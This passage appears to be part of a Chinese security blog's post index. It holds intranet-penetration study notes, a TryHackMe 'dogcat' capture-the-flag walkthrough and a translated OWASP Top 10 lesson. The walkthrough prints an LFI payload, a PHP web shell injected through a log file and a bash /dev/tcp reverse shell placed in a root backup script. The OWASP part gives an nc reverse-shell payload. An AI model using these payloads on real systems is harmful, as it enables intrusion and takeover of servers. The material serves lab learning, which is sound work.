","link":"https://f9f.fun/post/nei-wang-xue-xi-day2/"},{"title":"内网学习day1","content":"内网学习day1 1.什么叫内网 内网也指局域网，是指在某个区域由多台计算机互连而成的计算机组，内网渗透就是在内网中获取计算机权限 简单说一般渗透我们都是通过oa办公服务器进入到内网， 也可以是通过直接给对方管理员发送钓鱼邮件来获取到进入内网权限， 重点是当我们进入到内网后我们要做什么怎么做。 一般渗透步骤： 第一步：外网信息收集，比如对一个公司进行资产鉴定，也就是我们说的踩点 第二步：漏洞利用。就是利用漏洞黑进服务器，一般多为web型的漏洞，实战中漏洞利用最主要的目的就是控制对方电脑 第三步：权限提升，一般我们拿到对方电脑控制权不会是root权限也就是最高权限，这时候我们就要做权限提升，只有权限提升了我们才可以做创建新用户等操作， 第四步：权限维持，当我们利用某个漏洞获取到权限后，但是这个漏洞随时可能会被发现被修复，这时候我们就要做好权限维持的前提准备，做好后门，避免下次来的时候大门被关了 第五步：内网代理，隧道技术，你控制了第一台web服务电脑，但公司内部还有无数电脑怎么办，我们自己的电脑无法直接访问公司内部电脑这时候我们需要用我们控制的web服务电脑作为代理，就是利用web服务电脑做一个隧道，这样我们的流量就可以直接过去，我们的电脑也就可以直接访问内网电脑，我们也就进入到内网环境。 第六步：内网渗透，也可以叫做域渗透 第七步：痕迹清理，清除日志等 以上步骤也是要视情况 ，比如说你漏洞利用拿到的的一个权限就是最高权限等 2.内网渗透 一般步骤 第一步：内网信息收集，防火墙的端口 有没有安装杀软，内网中都有几个ip段 内网中都有哪些机器，内网中端口有哪些，域控在哪等等 对内网基本网络拓补结构做一个收集 第二步：内网漏洞利用，通过收集的信息来 第三步：横向利用，比如说先控制了第一台电脑，那我们如何控制后续的第二台，第三台。根据票据传递，hash传递等，控制后续电脑，横向移动 第四步：跨域攻击，比如说你控制了北京公司的电脑，如何跨域到杭州分部控制 内网学习流程 内网基础知识：什么是内网，内网的架构，工作组域的概念 用户权限解读：administrator权限和system权限区别，普通管理员和administrator区别，过了UAC和没过UAC的区别，域管和普通域控的区别等 内网认证机制：本地认证，网络认证，域认证 （黄金票据，委派攻击，ntm等都是用到这些协议） 内网信息收集： 密码抓取技术：rdp密码怎么明文拿到，浏览器密码怎么拿，内存密码，本机密码，怎么在线读，怎么导出读，怎么绕过杀软 内网横向移动：需要密码抓取技术 域内攻击手段：黄金白银票据，委派攻击，密码喷洒攻击等 3.工作组介绍 一个公司可能有很多台电脑上万台，这样所有电脑在一起如果不分组就会很混乱不利于管理，这时候就产生了工作组。 不同部门不同组方便管理员管理。 4，加入工作组 工作组默认workgroup 更改后重启即加入工作组 5.创建工作组 如果你输入的工作组在网络中不存在，那就相当于你创建了一个工作组，如果是创建过的，那你就加入了他的工作组。一个工作组的前提是机器要在同一个网段，是能相互ping通的。 6.退出工作组 是需要将工作组名称改成你想加入的就默认退出上一个的工作组 需要重启。 7.工作组的优缺点 优点： 方便管理和维护 资源分配方便、灵活 缺点： 缺乏集中管理与控制的机制 没有集中地统一账户管理 只适合小规模用户的使用 这时候域就出现了 域的出现就是适应大规模，有统一的管理机制，有同意的管理账户 8.域环境介绍 什么是域 域（Domain）是一个有安全边界的计算机结合，安全边界意思是两个域中，一个域中的用户无法访问另一个域中的资源，可以简单理解为升级版的工作组。与工作组相比，域的安全管理控制机制更加严格。用户想要访问域内的资源，必须要以合法的身份登录域，而用户对域内的资源拥有什么样的权限，还取决于用户在域内的身份。 形象点说，工作组就像大学，上课随便坐位，也可以不来 域就像是高中，座位是定好的， 比如一个域 域名abc.com DC就是域的管理员，给下面电脑统一换桌面，更改策略 备份DC就是防止DC出问题，功能和DC一致 9.单域和多域 一般来说，一个地理位置固定的小公司里，建立一个域就可以满足需求 在域内一般至少两台域服务器，一台作为DC另一台备份DC 多域就是说有多个域环境，每个域都有自己的DC。比如说公司部分划分，或者分公司划分。 多域的存在就涉及到跨域攻击。 10.父域和子域 出于一些管理需求，需要在网络中划分多个域，第一个域称为父域，其他分域就是该域的子域 在子域中可以再分出一个子域，比如yunwei.abc.com计算机太多了可以再分diyizu.yunwei.abc.com dierzu.yunwei.abc.com 这时候当我们控制了父域就相当于控制了子域，控制了子域也是相当于控制了父域 11.域树和域森林 域树（Tree)是多个域通过建立信任关系组成的集合。一个域管理员只能管理本域不能管理其他域。如果两个域之间需要相互访问，则需要建立信任关系，信任关系是连接不同域的桥梁。域树内的父域和子域，不但可以按照需要互相管理、还可以跨网络分配文件和打印机等设备及资源，从而在不同的域之间实现网络资源的共享与管理、通信及数据传输。 域森林是指多个域树通过建立信任关系的集合。例如一个公司兼并场景中某公司使用域树abc.com，被兼并的公司本来就有自己的域树abc.net，域树abc.net无法挂在域树abc.com下，所以域树abc.com与域树abc.net之间需要通过建立信任关系来构成域森林。通过域树之间的信任关系，可以管理和使用整个域森林中的资源，并保留被兼并公司自身原有特性。 ","link":"https://f9f.fun/post/nei-wang-xue-xi-day1/"},{"title":"【THM】靶场-dogcat-wp","content":"【THM】靶场-dogcatwp 信息收集 扫描端口服务 需要加上-Pn 扫了大概半个小时md... 22 80 端口开放 访问web服务端 点击dog就会显示一张狗的图片 点击cat就会显示一张猫的图片 命令执行漏洞 发现url地址栏?view= 尝试改个别的参数传上去 只可以传dog和cat 构造payload /?view=php://filter/read=convert.base64-encode/resource=./cat/../index PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg== <!DOCTYPE HTML> dogcat dogcat a gallery of various dogs or cats &lt;div&gt; &lt;h2&gt;What would you like to see?&lt;/h2&gt; &lt;a href=&quot;/?view=dog&quot;&gt;&lt;button id=&quot;dog&quot;&gt;A dog&lt;/button&gt;&lt;/a&gt; &lt;a href=&quot;/?view=cat&quot;&gt;&lt;button id=&quot;cat&quot;&gt;A cat&lt;/button&gt;&lt;/a&gt;&lt;br&gt; &lt;?php function containsStr($str, $substr) { return strpos($str, $substr) !== false; } $ext = isset($_GET[&quot;ext&quot;]) ? $_GET[&quot;ext&quot;] : '.php'; if(isset($_GET['view'])) { if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) { echo 'Here you go!'; include $_GET['view'] . $ext; } else { echo 'Sorry, only dogs or cats are allowed.'; } } ?&gt; &lt;/div&gt; 解码的到源码 需要留意 $ext = isset($_GET[&quot;ext&quot;]) ? $_GET[&quot;ext&quot;] : '.php';这行代码，文件后缀其实是可以指定的，不指定默认是.php 构造参数读取/etc/passwd文件 ?view=php://filter/read=convert.base64-encode/resource=./cat/../../../../etc/passwd&amp;ext=&amp; root❌0:0:root:/root:/bin/bash daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin bin❌2:2:bin:/bin:/usr/sbin/nologin sys❌3:3:sys:/dev:/usr/sbin/nologin sync❌4:65534:sync:/bin:/bin/sync games❌5:60:games:/usr/games:/usr/sbin/nologin man❌6:12👨/var/cache/man:/usr/sbin/nologin lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail❌8:8:mail:/var/mail:/usr/sbin/nologin news❌9:9:news:/var/spool/news:/usr/sbin/nologin uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy❌13:13:proxy:/bin:/usr/sbin/nologin www-data❌33:33:www-data:/var/www:/usr/sbin/nologin backup❌34:34:backup:/var/backups:/usr/sbin/nologin list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt❌100:65534::/nonexistent:/usr/sbin/nologin 解码后是这样 没有发现普通用户 找到access.log路径 ?view=php://filter/read=convert.base64-encode/resource=./cat/../../../../var/log/apache2/access.log&amp;ext=&amp; 解码后 127.0.0.1 - - [28/Jul/2023:05:23:24 +0000] &quot;GET / HTTP/1.1&quot; 200 615 &quot;-&quot; &quot;curl/7.64.0&quot; 10.18.43.179 - - [28/Jul/2023:05:23:55 +0000] &quot;GET / HTTP/1.1&quot; 200 537 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&quot; 10.18.43.179 - - [28/Jul/2023:05:23:55 +0000] &quot;GET /style.css HTTP/1.1&quot; 200 698 &quot;http://10.10.130.70/&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&quot; 10.18.43.179 - - [28/Jul/2023:05:23:55 +0000] &quot;GET /favicon.ico HTTP/1.1&quot; 404 491 &quot;http://10.10.130.70/&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&quot; 127.0.0.1 - - [28/Jul/2023:05:23:57 +0000] &quot;GET / HTTP/1.1&quot; 200 615 &quot;-&quot; &quot;curl/7.64.0&quot; 127.0.0.1 - - [28/Jul/2023:05:24:33 +0000] &quot;GET / HTTP/1.1&quot; 200 615 &quot;-&quot; &quot;curl/7.64.0&quot; 127.0.0.1 - - [28/Jul/2023:05:25:09 +0000] &quot;GET / HTTP/1.1&quot; 200 615 &quot;-&quot; &quot;curl/7.64.0&quot; 127.0.0.1 - - [28/Jul/2023:05:25:40 +0000] &quot;GET / HTTP/1.1&quot; 200 615 &quot;-&quot; &quot;curl/7.64.0&quot; 127.0.0.1 - - [28/Jul/2023:05:26:10 +0000] &quot;GET / HTTP/1.1&quot; 200 615 &quot;-&quot; &quot;curl/7.64.0&quot; 127.0.0.1 - - [28/Jul/2023:05:26:40 +0000] &quot;GET / HTTP/1.1&quot; 200 615 &quot;-&quot; &quot;curl/7.64.0&quot; 127.0.0.1 - - [28/Jul/2023:05:27:11 +0000] &quot;GET / HTTP/1.1&quot; 200 615 &quot;-&quot; &quot;curl/7.64.0&quot; 10.18.43.179 - - [28/Jul/2023:06:39:21 +0000] &quot;GET //?view=php://filter/read=convert.base64-encode/resource=./cat/../../../../etc/passwd&amp;ext=&amp; HTTP/1.1&quot; 200 1108 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&quot; 127.0.0.1 - - [28/Jul/2023:06:39:32 +0000] &quot;GET / HTTP/1.1&quot; 200 615 &quot;-&quot; &quot;curl/7.64.0&quot; 10.18.43.179 - - [28/Jul/2023:06:31:09 +0000] &quot;GET //?view=php://filter/read=convert.base64-encode/resource=./cat/../index HTTP/1.1&quot; 200 1251 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&quot; 由记录可见，记录了url和user-agent，我们打开burpsuite，把下面代码放到user-agent，验证是否存在文件解析漏洞 &lt;?php phpinfo(); ?&gt; 点击页面触发，可以显示php版本信息，证明漏洞存在 ?view=./cat/../../../../var/log/apache2/access.log&amp;ext=&amp; 我们可以看到，在路由旁边有用户代理参数。我们可以插入一个小的 php 脚本，稍后使用日志执行代码 <?php system($_GET['cmd']);?> 当我们使用日志请求索引页面时，我们可以添加一个“cmd”参数以及我们要执行的命令： 查看源代码 找关键词whoami 发现了目录下有flag.php 找到第一个flag THM{Th1s_1s_N0t_4_Catdog_ab67edfa} 后续我环境崩了 我用它自带的attackbox做 在提供的虚拟终端上开一个http服务器 然后把自己准备好的php反向shell curl下载 打开前要记得在终端开启端口监听 监听上了 然后就是先找低权限下的flag 在/var/www 下发现flag2 flag2_QMW7JvaY2LvK.txt THM{LF1_t0_RC3_aec3fb} 提权 sudo -l 发现env是root权限且不需要密码 尝试用env提权 上网搜关于env提权的方法 提权成功 找flag一般root目录下会有 在系统里查找所有文件里包含flag字样的文件： find / |xargs grep -ri 'flag' -l 有个backup 压缩包 在/opt/backups目录中，我们可以看到有一个定期运行的备份脚本，用于生成一个backup.tar文件。让我们利用这个来生成另一个反向shell，超越这个容器的限制。 我们可以很容易地利用这个脚本每隔一分钟以root权限运行一次，通过插入一些代码来生成一个反向连接。 要将这段代码插入到脚本中，只需运行以下命令: echo &quot;#!/bin/bash&quot; &gt; /opt/backups/backup.sh echo &quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.187.58/8888 0&gt;&amp;1'&quot; &gt;&gt; /opt/backups/backup.sh 再新建一个终端开启你设置的端口号监听 等待一会就可以监听上 总结 这个靶机涉及到docker逃逸 我在第一次提权后一直找不到最后一个flag是因为我们在docker里，我们需要逃逸到宿主机才能发现藏在宿主机里的flag4 ","link":"https://f9f.fun/post/thm-ba-chang-dogcat-wp/"},{"title":"[THM]-OWASP Top 10","content":"[THM]-OWASP Top 10 Injection（注入漏洞） Broken Authentication（存在缺陷的身份验证机制） Sensitive Data Exposure（敏感信息泄露） XML External Entity（XML外部实体注入-XXE漏洞） Broken Access Control（存在缺陷的访问控制机制） Security Misconfiguration（安全性配置错误） Cross-site Scripting（跨站脚本漏洞-XSS漏洞） Insecure Deserialization（不安全的反序列化-反序列化漏洞） Components with Known Vulnerabilities（具有已知漏洞的组件） Insufficent Logging &amp; Monitoring（日志记录和监控不足） 严重性top1注入 注入漏洞在当今的应用中非常普遍，之所以出现这些漏洞 是因为web应用程序会将用户所控制的输入数据解释为实际的命令或参数；注入攻击取决于当前web应用程序正在使用的技术以及这些技术会如何准确解释用户所输入的数据，一些常见的例子包括: SQL注入:当用户控制的输入数据被传递给后端的SQL查询语句时，就会发生SQL注入；通过利用该漏洞，攻击者可以传入SQL查询语句来操纵针对目标数据库的查询行为并获取到相关查询结果。 命令注入:当用户的输入被传递成为系统命令时，就会发生命令注入；通过利用该漏洞，攻击者能够在web应用服务器上执行任意的系统命令。 如果攻击者能够成功地传递一些 会被web应用程序正确解释的输入数据，他们将能够做以下事情: 当用户输入能被传递到数据库查询时，攻击者可以访问、修改和删除数据库中的数据信息；这意味着攻击者可以窃取个人详细信息和用户凭证等敏感信息。 攻击者可以在目标服务器上执行任意系统命令，这将允许攻击者访问 服务器用户所对应的权限级别下 的系统文件；然后攻击者就能够窃取敏感数据，并能对与 执行恶意命令的服务器 相链接的基础设施进行更多攻击。 防止注入攻击的主要防御措施是确保用户所控制的输入数据不会被解释为查询语句或有效命令，有几种不同的方法: 使用允许列表(白名单)：当用户提供的输入被发送到服务器时，此输入将会与安全输入或字符列表进行比较。如果用户所提供的输入数据被标记为安全的，那么它将被允许通过；否则，用户所提供的输入数据将被拒绝通过，应用程序此时也将抛出一个错误提示。 过滤用户所输入的数据：如果用户所提供的输入中包含某些危险字符，那么应用程序会首先将这些危险字符清除，然后再继续进行处理。 危险字符或危险输入会被归类为任何可能改变基础数据处理方式的外部输入，除了手动构造允许列表或仅仅清除输入数据之外，还有各种函数库可以帮助你执行防注入操作。 严重性top1操作系统命令注入 当web应用程序中的服务器端代码(如PHP代码)在宿主机上进行系统调用时，就可能会发生命令注入，这是一个web漏洞，该漏洞将允许攻击者利用其所构造的系统调用在服务器上执行任意操作系统命令。 有时，命令注入并不总是恶意的，比如执行 whoami 命令或者简单地执行 读取文件 命令；但是命令注入漏洞能为攻击者提供很多选择以进行漏洞利用，攻击者所能做的最糟糕的事情是利用命令注入漏洞来产生一个反向shell，并获得web服务器运行时所对应的用户权限。 通过简单地执行payload ;nc -e /bin/bash就可能获得目标web服务器的权限（注意：一些netcat命令的变体也可能不支持-e选项），你可以使用以下反向shell列表以及在线生成器作为替代方案： https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md https://www.revshells.com/ 一旦攻击者在web服务器上获得立足点，他们就可以开始对目标操作系统进行常见的枚举操作，并能够尝试寻找可用于提权或者内网横向移动的方法。 严重性top1命令注入实用 什么是主动命令注入？ 当向服务器发出的系统命令未在 HTML 文档中给攻击者返回响应消息时，发生的可能是盲注类型的命令注入；而在主动命令注入攻击中，攻击者将收到对应的响应消息，目标站点可以通过多个 HTML 元素使响应消息对攻击者可见。 让我们考虑一个场景：攻击者正在尝试建立基于 Web 的shell，但不小心将其暴露在 Internet 上，它还未完成，但如果目标网站存在命令注入漏洞，那么攻击者就可以利用该shell 并在目标网站的当前页面上看到来自系统调用的响应消息。 让我们看看 evilshell.php 中的示例代码，看看它在做什么，以及为什么它会激活命令注入。 EvilShell (evilshell.php) Code Example 查看伪代码，上面的代码片段会执行以下操作： 检查是否设置了参数“commandString”。 如果设置了，则变量 $command_string 将获取传递到用户输入字段中的内容。 然后程序将进入 try 块以执行函数passthru($command_string)。 你可以阅读有关passthru() 的文档，它会执行对应变量所传递的内容，然后将输出结果直接传递回浏览器中的网站相关页面。 如果 try 执行不成功，那么 catch 应该将错误消息输出到当前页面，但是这通常不会显示任何东西，因为在此处无法直接输出stderr(标准错误输出)，添加catch是因为PHP不允许我们在没有使用 catch 的情况下单独执行 try 。 检测主动命令注入的方法 当你可以看到系统调用的响应消息时，就说明发生了主动命令注入。在上面的代码中，函数passthru()会将响应消息直接传递给HTML文档，因此你可以在相关网页中看到你的命令注入payload的执行效果；正是因为基于这一点，所以我们可以通过输入一些有用的命令来尝试进一步枚举目标信息。对 passthru() 的函数调用可能并不总是在屏幕后发生，以上示例只是一个用来演示命令注入漏洞的简单方法。 可尝试执行的命令 Linux whoami id ifconfig/ip addr uname -a ps -ef lsb_release -a Windows whoami ver ipconfig tasklist netstat -an 使用cat /etc/passwd命令（查看non-root/non-service/non-daemon用户数目）： 使用cat /etc/passwd命令（查看当前用户名所对应的shell设置）： 使用lsb_release -a命令（查看操作系统版本）： 严重性top2损坏的身份验证 身份验证和会话(session)管理构成了现代 Web 应用程序的核心组件。身份验证允许用户通过验证其身份来访问 Web 应用程序，最常见的身份验证形式是使用用户名和密码机制。 用户需要输入密码凭据，然后服务器将验证它们是否正确，如果用户所提供的凭据是正确的，那么服务器将向用户的浏览器提供一个会话(session) cookie。之所以需要会话(session) cookie，是因为 Web 服务器将使用无状态的 HTTP(S)协议和客户端进行通信，通过附加会话 cookie 意味着服务器将知道是谁在发送什么数据，然后服务器就可以跟踪用户的操作。 如果攻击者能够发现身份验证机制中的缺陷，他们就可以成功访问其他用户所对应的帐户，这将允许攻击者能够访问某些敏感数据（取决于应用程序的目的）。身份验证机制中的一些常见缺陷包括： 暴力破解攻击：如果 Web 应用程序使用用户名和密码作为身份验证机制，攻击者可能会发起暴力破解攻击，该攻击将允许攻击者使用多次身份验证尝试来猜测用户名和密码，一旦破解成功攻击者就能非法通过身份验证机制。 使用弱凭证：Web 应用程序应设置强密码策略。 如果应用程序允许用户设置诸如“password1”或普通密码之类的弱验证凭据，那么攻击者就能够轻松猜解出这些凭据并实现对用户帐户的访问。 弱会话 Cookie：会话(Session) Cookie 是服务器跟踪用户操作的方式。 如果会话 cookie 包含的是一些可预测的值，那么攻击者就可以伪造会话 cookie 并实现对用户帐户的访问。 根据确切的身份验证机制缺陷，可以有多种针对损坏的身份验证机制的缓解措施： 为防御密码猜测类型的攻击，请确保web应用程序执行强密码策略。 为防御暴力破解攻击，请确保web应用程序在一定次数的失败的验证尝试后 强制执行自动锁定操作，这将防止攻击者发起更多的暴力破解攻击尝试。 实施多因素身份验证——如果用户有多种身份验证方法，例如，使用用户名和密码机制并要求用户在其移动设备上接收短信代码等，那么攻击者将很难同时获得两种凭据以访问目标用户的帐户。 严重性top2损坏的身份验证练习 本小节将通过一个示例以研究身份验证机制中的逻辑缺陷。 当开发人员忘记清理用户在web应用程序代码中提供的输入（用户名和密码）时，可能会使目标web应用程序容易受到 SQL 注入等攻击。 但是，在此处我们将重点关注一个逻辑缺陷，即：关于现有用户的重新注册问题。 例子：假设有一个名为 admin 的现有用户，现在我们想要访问admin帐户，我们可以尝试对用户名稍作修改并重新注册用户名，进入用户名注册页面：我们在用户名字段中输入“ admin”（注意此用户名开头含有空格），然后接着输入其他必需信息（如电子邮件ID或密码等）并提交该数据，该操作会注册一个新用户，但该用户将拥有与普通管理员相同的权限。通过登录新用户就能够看到admin用户权限下的相关内容。 要查看实际效果，请访问 http://MACHINE_IP:8888 并尝试注册一个名为 darren的用户，你会看到一个提示，告诉你该用户已经存在，我们继续尝试注册名为“ darren”的用户（注意此用户名开头含有空格），注册完成之后进行登录操作，我们就能看到 darren 帐户中的内容。 严重性top3敏感信息泄露-介绍 当 web 应用程序意外泄露敏感数据时，我们将其称为“敏感数据泄露”，这些数据通常是与用户直接相关的数据（例如姓名、出生日期、财务信息等），但也可能是一些技术信息，例如用户名和密码。在更复杂的层面上，这通常涉及诸如“中间人攻击”之类的技术，攻击者将通过他们控制的设备强制用户连接，然后利用对任何传输数据的弱加密来获取对拦截信息的访问权限（如果数据首先经过了加密......）。当然，有些示例要简单得多，我们可以在 目标Web 应用程序中找到该类漏洞，而且无需任何高级网络知识即可利用这些漏洞。事实上，在某些情况下，敏感数据可以直接在web服务器相关的的网站页面上找到...... 严重性top3敏感信息泄露-例子 以一种可以同时从多个位置轻松访问的格式来存储大量数据的最常见方法是通过数据库。 这显然非常适合 Web 应用程序，因为可能会有许多用户在任意时间内与目标网站发生交互。 数据库引擎通常遵循结构化查询语言 (SQL-Structured Query Language) 语法； 然而，一些替代方案（例如 NoSQL）也越来越受欢迎。 在生产环境中，通常会看到在专用服务器上设置数据库，如运行 MySQL 或 MariaDB 等数据库服务；但是，数据库也可以被存储为文件形式，这些文件形式的数据库被称为“平面文件(flat-file)”数据库，因为它们是作为单个文件而存储在计算机上的。 使用“平面文件(flat-file)”比设置完整的数据库服务器要容易得多，因此可能会在较小的 Web 应用程序中看到。 如前所述，平面文件数据库是作为文件存储在计算机磁盘上的，这对于 Web 应用程序来说不会造成其他问题，但是如果将平面文件数据库存储在网站的根目录下（即连接到网站用户所能够访问的文件之一），将会发生什么情况呢？ 这将导致我们可以直接下载它到我们的本地机器上，并且可以完全访问对应的平面文件数据库中的所有内容，进而造成了敏感数据泄露！ 让我们简要介绍一些用于查询平面文件数据库的语法。 最常见（也是最简单）的平面文件数据库格式是 sqlite 数据库，可以在大多数编程语言环境下进行交互，并且有一个专门的客户端可以在命令行上查询数据信息，这个客户端叫做“sqlite3”，在 Kali 中将默认安装。 假设我们已经成功地下载了一个平面文件数据库： 我们可以看到在当前文件夹中有一个SQLite数据库文件。 要访问它，我们可以使用：sqlite3 &lt;database-name&gt; 然后我们可以接着查看数据库中的表，通过使用命令.tables： 此时我们可以转储该表中的所有数据，但在转储数据之前，我们还需要先查看表的相关信息，否则我们不一定知道表中每一列的具体含义。 首先使用PRAGMA table_info(customers);查看表信息，然后使用SELECT * FROM customers;转储该表中的信息： 我们从表信息中可以看出，此表一共有四列：custID、custName、creditCard和password。 你可能会注意到这与查询该表的结果相符。 取第一行： 0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99 我们能够得知数据信息 custID (0)、custName (Joy Paulson)、creditCard (4916 9012 2231 7905) 和密码哈希值 (5f4dcc3b5aa765d61d8327deb882cf99)。 在下一小节中，我们将着眼于破解这个哈希值。 严重性top3敏感信息泄露-材料2 在上一个小节中，我们了解了如何查询 SQLite 数据库中的敏感数据，并且找到了一些密码哈希值(每个用户都有一个)。 在本小节中，我们将简要介绍如何破解这些密码哈希值。 在哈希破解方面，Kali 预装了各种工具——如果你知道如何使用这些工具，请随意使用即可。 在本小节中我们将使用在线工具进行hash破解工作：Crackstation。Crackstation网站非常擅长破解弱密码的哈希值，而对于更复杂的哈希，我们则需要使用其他工具来进行破解； 例子中的所有可破解的密码哈希值都是弱密码的 MD5 哈希值，所以我们直接使用Crackstation在线破解即可。 当我们导航到Crackstation网站时，我们会看到以下界面： 粘贴我们在上一小节中找到的 Joy Paulson 的密码哈希值(5f4dcc3b5aa765d61d8327deb882cf99) ，勾选验证码，然后点击“破解哈希”按钮即可： 我们看到哈希值被成功破解，目标用户的密码是“password”！ 注意：Crackstation 网站在破解hash时，将使用很大的字典，如果哈希值所对应的密码确实不在字典中，那么 Crackstation 将无法破解该哈希值。 严重性top3敏感信息泄露-练习 启动目标机器，访问目标站点，查看login网页的页面源代码，可以看到作者留下的一些评论，告诉我们 /assets 中有一个数据库文件： 下载数据库 并在kali上打开 是数据库文件 使用命令sqlitebrowser webapp.db通过使用可视化客户端打开数据库文件，查看用户表中的敏感信息： 使用以下网站，进行在线hash破解操作： https://crackstation.net/ https://hashes.com/en/decrypt/hash 使用刚才得到的明文密码信息以admin用户身份登录目标站点，查看flag内容： 严重性top4XML 外部实体注入（XXE漏洞） XML 外部实体 (XXE) 注入是一种滥用 XML 解析器/数据 功能的漏洞。它通常允许攻击者与应用程序本身可以访问的任何后端或外部系统进行交互，并且可以允许攻击者读取该系统上的文件，XXE还可以导致拒绝服务 (DoS-Denial of Service) 攻击，或者可以使用 XXE 执行服务器端请求伪造 (SSRF)，诱导 Web 应用程序向其他应用程序发出请求。 XXE甚至能够进行端口扫描以及导致远程代码执行。 XXE 攻击有两种类型：带内(in-band)和带外 (out-of-band)，带外的XXE可简写为OOB-XXE。 1.在带内 XXE 攻击中，攻击者可以立即收到web应用程序对 XXE payload的响应。 2.在带外 XXE 攻击（也可称为盲注类型的 XXE）中，Web 应用程序不会立即响应XXE payload，攻击者必须将XXE payload对应的响应输出反映到其他文件中或攻击者所控制的服务器上。 严重性top4XXE漏洞-XML可扩展标记性语言 在我们继续学习如何利用XXE 漏洞之前，我们必须正确理解 XML 的概念。 什么是XML？ XML（eXtensible Markup Language-可扩展标记语言）是一种标记语言，它定义了一组规则，用于以人工可读和机器可读的格式对文档进行编码处理，XML是一种用于存储和传输数据的标记语言。 为什么要使用XML？ 1.XML 是独立于平台和编程语言的，因此它可以在任何系统上使用，并能支持IT技术变更的情况。 2.使用 XML 存储和传输的数据可以在任何时间点更改，且不会影响数据表示。 3.XML 允许使用 DTD 和Schema(模式)进行内容验证，此验证可确保 XML 文档没有任何语法错误。 4.由于XML独立于平台的特性，它简化了各种系统之间的数据共享，因为XML数据在不同系统之间传输时 不需要进行任何转换处理。 语法 每个 XML 文档大多以 XML Prolog 开头： &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 上面一行被称为 XML 序言(prolog )，它将指定 XML 版本和 XML 文档中所使用的编码类型，该行不是强制使用的，但将这一行放在所有 XML 文档的开头被认为是一种“良好做法”。 每个 XML 文档都必须包含一个“ROOT”元素，例如： 在上面的示例中，&lt;mail&gt; 是该文档的 ROOT 元素，&lt;to&gt;、&lt;from&gt;、&lt;subject&gt;、&lt;text&gt; 是子元素。 如果一个 XML 文档没有任何根元素，那么它将被认为是错误的或无效的 XML 文档。 另一件要记住的事情是 XML 是一种区分大小写的语言：如果标签以 &lt;to&gt; 开头，那么它必须以 &lt;/to&gt; 结尾，而不能以 &lt;/To&gt; （大写T ）结尾。 与 HTML 一样，我们也可以在 XML 中使用属性(attributes )，XML中关于属性的语法也与 HTML 非常相似，例如： You need to learn about XXE 在上面的示例中，category 是属性名称，message 是属性值。 严重性TOP4 XXE漏洞-DTD概念 在我们继续学习XXE之前，我们必须了解XML中的DTD是什么。 DTD 代表文档类型定义(Document Type Definition)，DTD将定义一个XML 文档的结构以及合法元素和属性(attributes )。 假设我们有一个名为 note.dtd 的文件 其中包含以下内容： &lt;!DOCTYPE note [ &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT heading (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; ]&gt; 现在我们可以使用这个 DTD 来验证一些 XML 文档的信息，并确保 XML 